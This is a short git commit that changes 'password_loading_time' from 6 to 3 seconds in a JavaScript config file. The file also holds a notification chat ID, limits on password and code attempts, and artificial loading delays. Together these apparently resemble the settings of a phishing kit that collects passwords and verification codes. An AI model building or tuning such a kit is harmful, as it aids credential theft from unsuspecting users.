279cfa5b1e0563c637d1d0eaad0091e16d9c593a
kindscongchua7-crypto <kindscongchua7@gmail.com>
2026-05-05 20:20:56 +0700

    Change password loading time from 6 to 3 seconds

--- src/utils/config.js
+++ src/utils/config.js
@@ -5,7 +5,7 @@ const config = {
     noti_chat_id: '',
     max_password_attempts: 2,
     max_code_attempts: 4,
-    password_loading_time: 6,
+    password_loading_time: 3,
     code_loading_time: 4
 };
 export default config;
